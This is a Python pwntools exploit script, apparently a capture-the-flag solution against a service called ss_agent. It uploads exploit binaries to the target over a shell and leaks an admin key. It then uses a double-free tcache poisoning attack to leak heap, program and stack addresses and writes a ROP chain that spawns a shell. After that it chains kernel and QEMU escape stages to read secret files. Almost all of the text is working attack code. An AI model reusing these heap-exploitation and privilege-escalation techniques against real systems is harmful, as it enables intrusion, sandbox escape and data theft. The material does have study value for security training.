#!/usr/bin/env python3

from pwn import *
#import time
from time import sleep
#import string
import sys
import base64
import gzip

context.terminal = ["tmux","split","-h"]

def register_user(namelen, name):
    assert "\n" not in str(name)
    global s
    s.sendlineafter("Input your choice:", "1")
    s.sendlineafter("How long is your name ?", str(namelen))
    s.sendafter("What is your name ?", name);
    if len(name) < namelen:
        s.send("\n")
    s.recvuntil("Hello ")
    r = s.recvn(namelen)
    s.recvuntil("Successfully register")
    return r

def store_my_data(slot_index, data_len, data, key):
    assert "\n" not in str(data)
    assert(len(key) == 16)
    global s
    s.sendlineafter("Input your choice:", "2")
    s.sendlineafter("Which slot ?", str(slot_index))
    s.sendlineafter("How long is your data ?", str(data_len))
    s.sendafter("Now input your data:", data)
    if len(data) < data_len:
        s.send("\n")
    s.sendlineafter("Input your key (remember it):", key)
    s.recvuntil("Successfully store")

def retrieve_my_data(slot_index, key):
    assert(len(key) == 16)
    global s
    s.sendlineafter("Input your choice:", "3")
    s.sendlineafter("Which slot ?", str(slot_index))
    s.sendlineafter("Input your key:", key)
    s.recvuntil("Checking...")
    #t1 = time.time()
    r = s.recvline()
    #t2 = time.time()
    #print("time: ", t2-t1)
    if b"Error: key error" in r:
        return
    assert b"Pass check" in r
    s.recvuntil("Your data is ")
    r = s.recvline()
    s.recvunitl("Finish")
    return r

def kick_out_last_registered_user(admin_key):
    assert(len(admin_key) == 32)
    global s
    s.sendlineafter("Input your choice:", "4")
    s.sendlineafter("Input admin key:", admin_key)
    s.recvuntil("Checking...")
    s.recvuntil("\n")
    #t1 = time.time()
    r = s.recvline()
    #t2 = time.time()
    #print("time: ", t2-t1)
    if b"Error: key error" in r:
        #return t2-t1, None
        return None
    assert b"Pass check" in r
    s.recvuntil("Last registered user is ")
    r = s.recvuntil("User kicked out", drop=True)
    #return t2-t1, r
    return r

def exit_program():
    global s
    s.sendlineafter("Input your choice:", "5")


def alloc(size, content):
    print("alloc: "+content.hex())
    return register_user(size, content)

def free():
    global admin_key
    return kick_out_last_registered_user(admin_key)


def cut(obj, sec):
    # https://blog.csdn.net/qq_26373925/article/details/101135611
    return [obj[i:i+sec] for i in range(0,len(obj),sec)]

def sendfile(filename):
    global s
    with open(filename, "rb") as f:
        content = f.read()
    #content_gzip_base64 = base64.encodebytes(gzip.compress(content))
    content_gzip_base64 = base64.b64encode(gzip.compress(content))
    s.sendlineafter("$ ", "stty -echo")
    #s.sendlineafter("$ ", f"echo {content_gzip_base64.decode()} | base64 -d | gunzip >/tmp/{filename}")
    s.sendlineafter("$ ", f"cat <<EOF | base64 -d | gunzip >/tmp/{filename}")
    linelist = cut(content_gzip_base64, 1400)
    n = len(linelist)
    i = 0
    for line in linelist:
        i += 1
        print(i, n)
        s.sendlineafter("> ", line)
    s.sendline("EOF")

    s.sendlineafter("$ ", f"chmod 777 /tmp/{filename}")
    s.sendlineafter("$ ", "stty echo")



#s = process("../src/ss_agent")
#attach(s)

#s = process(["sh", "-c", "(cd ../deployment ; ./start.sh)"],stdout=PIPE) ; s.sendlineafter("press Enter to activate this console.", "") ; s.sendlineafter("/ $ ", "stty -echo") ; s.sendlineafter("/ $ ", "/challenge/ss_agent")


# start server by ` socat tcp-l:12345,fork,reuseaddr exec:./start.sh,setsid,stderr  ` at "../deployment/test/", and qemu redirict /dev/ttyS1 to tcp listen port 3234
# stty raw is necessary, or some special char will be treated as tty control char and generate some signal

#s = remote("127.0.0.1", 12345) ; s.sendlineafter("/ $ ", "stty -echo") ; s.sendlineafter("/ $ ", "stty raw") ; s.sendlineafter("/ $ ", "/challenge/exec_wrapper /challenge/gdbserver-7.10.1-x64 --no-disable-randomization /dev/ttyS1 /challenge/ss_agent")

# local test without debug
s = remote("127.0.0.1", 12345)

# remote server
#s = remote("111.186.58.135", 12021)


sendfile("exp_stage1_leak")
sendfile("exp_stage3_kernel")
sendfile("exp_stage4_qemu")
sendfile("sh")

s.sendlineafter("/ $ ", "stty -echo") ; s.sendlineafter("/ $ ", "stty raw")

# stage1: leak

#'''
s.sendlineafter("/ $ ", "/tmp/exp_stage1_leak")
s.recvuntil("exp_stage1_leak finshed, admin_key:")
s.recvuntil("\n")    # if not stty raw, the line is endswith \r\n
admin_key = s.recvline().strip()
#'''
#admin_key = "0123456789abcdefFEDCBA9876543210"    # XXX
#admin_key = "yIqOWG6uyE2xldHdJef7AnsRNS01Px1I"

print(admin_key)

#raw_input("stage1 finish")

# stage2: user

s.sendlineafter("/ $ ", "/challenge/ss_agent")

#s.recvuntil("Remote debugging") ; gdb.attach(("localhost", 3234))

# leak heap address
alloc(0x20-8, b"")
free()
free()
r = alloc(0x20-8, b"")

heap_addr = u64(r[:8])
#print(r.hex())
print(hex(heap_addr))
heap_addr_offset = (heap_addr & 0xfff) + 0x1000
#fake_on_heap_addr = heap_addr-(0x1b50-0x858)
fake_on_heap_addr = heap_addr-(heap_addr_offset-0x858)

#raw_input("wait1\n")

# leak program address and stack address
alloc(0x3f0-8, b"")    # near the max tcache size
free()
free()
#free()
alloc(0x3f0-8, p64(fake_on_heap_addr))
alloc(0x3f0-8, b"")
r = alloc(0x3f0-8, b"")

print(r.hex())
#raw_input("wait2\n")
main_arena_addr = u64(r[0:8])
program_base = main_arena_addr - (0x7f27f619c7a0-0x7f27f60d4000)
stack_addr = u64(r[0xb80-0x858:0xb80-0x858+8])
main_ret_on_stack = stack_addr - (0xf8-0x90)    # libc_start_main_ret
print(hex(program_base), hex(stack_addr), hex(main_ret_on_stack))

#raw_input("wait3\n")

# alloc on stack and rop
alloc(0x400-8, b"")
free()
free()
#free()
#raw_input("wait4\n")
alloc(0x400-8, p64(main_ret_on_stack))
alloc(0x400-8, b"")

pop_rax_ret = program_base+0x1f8f4
pop_rdi_ret = program_base+0x94c6
pop_rdx_rsi_ret = program_base+0x56109
syscall = program_base+0xabcc

ropchain = p64(pop_rax_ret)+p64(59) \
    +p64(pop_rdi_ret)+p64(main_ret_on_stack+8*8) \
    +p64(pop_rdx_rsi_ret)+p64(0)+p64(0) \
    +p64(syscall) \
    +b"/tmp/sh\0"
#    +b"/bin/sh\0"

assert b'\n' not in ropchain

r = alloc(0x400-8, ropchain)
#print(r.hex())

exit_program()

s.sendlineafter("/ $ ", "cat /challenge/secret2.txt")
secret2 = s.recvuntil("/ $ ")
s.sendline()
print("secret2: ", secret2)

# stage3: kernel

s.sendlineafter("/ $ ", "/tmp/exp_stage3_kernel")
s.sendlineafter("/ # ", "cat /challenge/secret3.txt")
secret3 = s.recvuntil("/ # ")
s.sendline()
print("secret3: ", secret3)

# stage4: qemu

s.sendlineafter("/ # ", "/tmp/exp_stage4_qemu")

s.interactive()

